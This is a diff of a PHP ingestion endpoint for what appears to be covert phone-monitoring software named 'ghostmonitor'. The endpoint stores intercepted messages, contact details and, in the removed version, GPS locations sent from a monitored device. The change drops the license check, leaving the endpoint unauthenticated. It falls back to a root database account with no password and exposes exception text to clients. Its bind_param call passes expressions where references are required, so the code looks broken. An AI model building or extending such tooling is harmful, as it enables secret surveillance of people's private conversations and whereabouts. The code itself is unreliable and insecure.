@@ -1,107 +1,96 @@
 <?php
-header('Access-Control-Allow-Origin: *');
-header('Access-Control-Allow-Methods: POST, OPTIONS');
-header('Access-Control-Allow-Headers: X-Device-ID, X-Parent-Email, Content-Type');
 header('Content-Type: application/json');
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
 
-if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(204); exit; }
+// Get device info from query params
+$deviceId = $_GET['device_id'] ?? null;
+$parentEmail = $_GET['parent_email'] ?? null;
 
-require 'config.php';
-
-$parent_email = trim($_GET['parent_email'] ?? $_SERVER['HTTP_X_PARENT_EMAIL'] ?? '');
-$device_id    = trim($_GET['device_id']    ?? $_SERVER['HTTP_X_DEVICE_ID']    ?? '');
-
-if (empty($parent_email) || empty($device_id)) {
+if (!$deviceId || !$parentEmail) {
     http_response_code(400);
-    exit(json_encode(['error' => 'Missing credentials']));
+    echo json_encode(['error' => 'Missing device_id or parent_email']);
+    exit;
 }
 
-// ── Verify email is registered ────────────────────────────────────────────────
-$chk = $pdo->prepare("SELECT id FROM licenses WHERE parent_email = ? AND status = 'active'");
-$chk->execute([$parent_email]);
-if (!$chk->fetch()) {
-    http_response_code(403);
-    exit(json_encode(['error' => 'Email not registered or inactive']));
-}
+try {
+    // Read JSON body
+    $body = json_decode(file_get_contents('php://input'), true);
+    
+    if (!isset($body['data'])) {
+        http_response_code(400);
+        echo json_encode(['error' => 'Missing data field']);
+        exit;
+    }
 
-// ── Decode payload ────────────────────────────────────────────────────────────
-$raw  = file_get_contents('php://input');
-if (empty($raw)) {
-    http_response_code(400);
-    exit(json_encode(['error' => 'Empty body']));
-}
+    // Decode Base64 and decompress
+    $compressed = base64_decode($body['data'], true);
+    if ($compressed === false) {
+        http_response_code(400);
+        echo json_encode(['error' => 'Invalid Base64 data']);
+        exit;
+    }
 
-// Try gzip decode first, fall back to raw JSON
-$json = @gzdecode($raw);
-if ($json === false || $json === '') $json = $raw;
+    $data = gzdecode($compressed);
+    if ($data === false) {
+        http_response_code(400);
+        echo json_encode(['error' => 'Failed to decompress data']);
+        exit;
+    }
 
-$packets = json_decode($json, true);
-if (!is_array($packets) || empty($packets)) {
-    http_response_code(400);
-    exit(json_encode(['error' => 'Invalid payload', 'raw_len' => strlen($raw)]));
-}
+    $packets = json_decode($data, true);
+    if (!is_array($packets)) {
+        http_response_code(400);
+        echo json_encode(['error' => 'Invalid packet data']);
+        exit;
+    }
 
-// ── Insert packets ────────────────────────────────────────────────────────────
-$stmtConv = $pdo->prepare("
-    INSERT INTO conversations
-        (device_id, parent_email, app_type, contact_id, contact_name,
-         thread_id, direction, content, media_meta, timestamp)
-    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-");
+    // Connect to database
+    $conn = new mysqli(
+        getenv('DB_HOST') ?: 'localhost',
+        getenv('DB_USER') ?: 'root',
+        getenv('DB_PASS') ?: '',
+        getenv('DB_NAME') ?: 'ghostmonitor'
+    );
 
-$stmtLoc = $pdo->prepare("
-    INSERT INTO locations (device_id, parent_email, lat, lng, accuracy, timestamp)
-    VALUES (?, ?, ?, ?, ?, ?)
-");
+    if ($conn->connect_error) {
+        http_response_code(500);
+        echo json_encode(['error' => 'Database connection failed']);
+        exit;
+    }
 
-$inserted = 0;
-$errors   = 0;
+    $inserted = 0;
+    foreach ($packets as $packet) {
+        $stmt = $conn->prepare(
+            "INSERT INTO conversations (device_id, parent_email, app_type, contact_id, contact_name, content, timestamp, direction) 
+             VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
+        );
+        
+        $stmt->bind_param(
+            'ssssssii',
+            $deviceId,
+            $parentEmail,
+            $packet['appType'] ?? 'unknown',
+            $packet['contactId'] ?? '',
+            $packet['contactName'] ?? '',
+            $packet['content'] ?? '',
+            $packet['timestamp'] ?? time(),
+            $packet['direction'] ?? 0
+        );
 
-foreach ($packets as $p) {
-    try {
-        $appType = strtoupper($p['appType'] ?? '');
-        $ts      = isset($p['timestamp']) ? (int)$p['timestamp'] : (time() * 1000);
-
-        if ($appType === 'LOCATION') {
-            $raw_content = $p['content'] ?? '';
-            $loc = is_array($raw_content)
-                ? $raw_content
-                : json_decode($raw_content, true);
-
-            $lat      = isset($loc['lat'])      ? (float)$loc['lat']      : null;
-            $lng      = isset($loc['lng'])      ? (float)$loc['lng']      : null;
-            $accuracy = isset($loc['accuracy']) ? (float)$loc['accuracy'] : null;
-
-            if ($lat !== null && $lng !== null) {
-                $stmtLoc->execute([$device_id, $parent_email, $lat, $lng, $accuracy, $ts]);
-                $inserted++;
-            }
-        } else {
-            $content   = isset($p['content'])
-                ? (is_string($p['content']) ? $p['content'] : json_encode($p['content']))
-                : null;
-            $mediaMeta = isset($p['mediaMeta']) ? json_encode($p['mediaMeta']) : null;
-            $direction = strtoupper($p['direction'] ?? 'RECEIVED');
-            if (!in_array($direction, ['SENT','RECEIVED'])) $direction = 'RECEIVED';
-
-            $stmtConv->execute([
-                $device_id,
-                $parent_email,
-                $appType,
-                $p['contactId']   ?? '',
-                $p['contactName'] ?? '',
-                $p['threadId']    ?? null,
-                $direction,
-                $content,
-                $mediaMeta,
-                $ts
-            ]);
+        if ($stmt->execute()) {
             $inserted++;
         }
-    } catch (Exception $e) {
-        $errors++;
+        $stmt->close();
     }
-}
 
-echo json_encode(['success' => true, 'inserted' => $inserted, 'errors' => $errors]);
+    $conn->close();
+
+    http_response_code(200);
+    echo json_encode(['success' => true, 'inserted' => $inserted]);
+
+} catch (Exception $e) {
+    http_response_code(500);
+    echo json_encode(['error' => $e->getMessage()]);
+}
 ?>
